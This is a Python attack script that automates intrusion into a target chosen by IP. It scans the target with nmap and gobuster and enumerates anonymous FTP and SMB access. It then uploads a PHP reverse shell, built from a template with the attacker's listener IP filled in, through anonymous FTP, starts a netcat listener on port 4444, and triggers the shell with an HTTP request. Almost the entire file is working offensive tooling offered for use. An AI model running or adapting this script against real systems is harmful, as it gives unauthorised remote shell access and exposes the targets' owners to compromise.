#!/usr/bin/python3
import os
import ipaddress
import ftplib
import subprocess
import requests
import shutil
import sys

print("HELLO HACKER\n")

ip = input("enter the ip of the target: ").strip()

try:
    ip = str(ipaddress.ip_address(ip))
except ValueError:
    print("Invalid IP address. Exiting.")
    sys.exit(1)

# helper
def tool_exists(name):
    return shutil.which(name) is not None

# run nmap (use subprocess, no shell)
if not tool_exists("nmap"):
    print("nmap not found in PATH. Install it and re-run.")
    sys.exit(1)

print(f"Running nmap against {ip} ...")
try:
    subprocess.run(["nmap", "-sV", "-Pn", "-oN", "nmap_result.txt", ip], check=True, timeout=300)
except subprocess.CalledProcessError as e:
    print(f"nmap returned non-zero exit: {e}")
except subprocess.TimeoutExpired:
    print("nmap timed out.")
except Exception as e:
    print(f"Failed to run nmap: {e}")

################################################################

http_open = False
https_open = False
ftp_open = False
smb_open = False

try:
    with open("nmap_result.txt", "r") as file:
        for line in file:
            line_lower = line.lower()
            # simple checks — for robust parsing use xml output / python-nmap
            if "80/tcp" in line_lower and "open" in line_lower and ("http" in line_lower or "www" in line_lower):
                http_open = True
            if "443/tcp" in line_lower and "open" in line_lower and ("https" in line_lower or "ssl" in line_lower):
                https_open = True
            if "21/tcp" in line_lower and "open" in line_lower and "ftp" in line_lower:
                ftp_open = True
            if (("139/tcp" in line_lower and "open" in line_lower) or ("445/tcp" in line_lower and "open" in line_lower)) and ("smb" in line_lower or "microsoft-ds" in line_lower):
                smb_open = True
except FileNotFoundError:
    print("nmap_result.txt not found — skipping port parsing.")
except Exception as e:
    print(f"Error reading nmap result: {e}")

# run gobuster if present and HTTP/HTTPS found
if http_open or https_open:
    if not tool_exists("gobuster"):
        print("gobuster not found; skipping directory brute force.")
    else:
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        if not os.path.isfile(wordlist):
            print(f"Default wordlist {wordlist} not found; specify a valid wordlist if you want to run gobuster.")
        else:
            if http_open:
                print("HTTP (port 80) open, running Gobuster on http://")
                try:
                    subprocess.run(["gobuster", "dir", "-u", f"http://{ip}", "-w", wordlist, "-o", "gobuster_http.txt"], check=True, timeout=600)
                except Exception as e:
                    print(f"Gobuster (http) failed: {e}")
            if https_open:
                print("HTTPS (port 443) open, running Gobuster on https://")
                try:
                    subprocess.run(["gobuster", "dir", "-u", f"https://{ip}", "-w", wordlist, "-o", "gobuster_https.txt"], check=True, timeout=600)
                except Exception as e:
                    print(f"Gobuster (https) failed: {e}")
else:
    print("No HTTP or HTTPS service detected. Skipping Gobuster.")

#######################################################################

if ftp_open:
    try:
        print(f"Trying anonymous FTP login on {ip}...")
        ftp = ftplib.FTP(ip, timeout=10)
        ftp.login()
        print("Anonymous FTP login successful!")

        try:
            files = ftp.nlst()
        except Exception:
            files = []
        print("Files on FTP server:")
        with open("ftp_files.txt", "w") as f_out:
            for f in files:
                print(f" - {f}")
                f_out.write(f + "\n")

        # attempt to spawn a terminal with an ftp session script (optional)
        if tool_exists("gnome-terminal"):
            try:
                subprocess.Popen(['gnome-terminal', '--', 'python3', 'ftp_session.py', ip])
            except Exception as e:
                print(f"Failed to open gnome-terminal for ftp_session.py: {e}")
        else:
            print("gnome-terminal not found — open ftp_session.py manually if needed.")

        # Ask for listener IP only if we're going to try uploading & triggering web shell
        if http_open or https_open:
            listener_ip = input("Enter your listener IP for the reverse shell: ").strip()

            template_path = "reverse_shell_template.php"
            if not os.path.isfile(template_path):
                print(f"{template_path} not found — cannot create reverse shell file.")
            else:
                with open(template_path, "r") as f:
                    content = f.read()

                content = content.replace("YOUR_IP_HERE", listener_ip)

                with open("reverse_shell.php", "w") as f:
                    f.write(content)

                try:
                    with open("reverse_shell.php", "rb") as shell_file:
                        ftp.storbinary("STOR reverse_shell.php", shell_file)
                    print("Reverse shell uploaded!")

                    # Start netcat listener in a new terminal if available
                    if tool_exists("gnome-terminal") and tool_exists("nc"):
                        try:
                            subprocess.Popen(['gnome-terminal', '--', 'nc', '-lvnp', '4444'])
                            print("Netcat listener started on port 4444 (in new terminal).")
                        except Exception as e:
                            print(f"Failed to spawn netcat in new terminal: {e}")
                    else:
                        print("Either gnome-terminal or nc not available — start your listener manually: nc -lvnp 4444")

                    # Trigger shell only if HTTP detected
                    if http_open:
                        url = f"http://{ip}/reverse_shell.php"
                    elif https_open:
                        url = f"https://{ip}/reverse_shell.php"
                    else:
                        url = None

                    if url:
                        try:
                            response = requests.get(url, timeout=5)
                            print(f"Triggered reverse shell, HTTP response code: {response.status_code}")
                        except Exception as e:
                            print(f"Failed to trigger reverse shell: {e}")
                except ftplib.error_perm:
                    print("Upload failed: Permission denied or upload disabled. Moving on.")
                except Exception as e:
                    print(f"Upload failed: {e}. Moving on.")

        ftp.quit()

    except Exception as e:
        print(f"FTP or trigger failed: {e}")

if smb_open:
    print(f"SMB ports detected on {ip}. Trying anonymous SMB share listing...")

    if not tool_exists("smbclient"):
        print("smbclient not found; install samba-client package or smbclient to enumerate SMB shares.")
    else:
        try:
            result = subprocess.run(['smbclient', '-L', ip, '-N'], capture_output=True, text=True, timeout=20)
            output = result.stdout.strip()

            if "NT_STATUS_ACCESS_DENIED" in output or "NT_STATUS_LOGON_FAILURE" in output:
                print("Anonymous SMB login denied.")
            else:
                print("Anonymous SMB shares found:")
                print(output)
                with open(f"smb_shares_{ip}.txt", "w") as f:
                    f.write(output)
        except subprocess.TimeoutExpired:
            print("SMB share listing timed out.")
        except Exception as e:
            print(f"SMB enumeration failed: {e}")
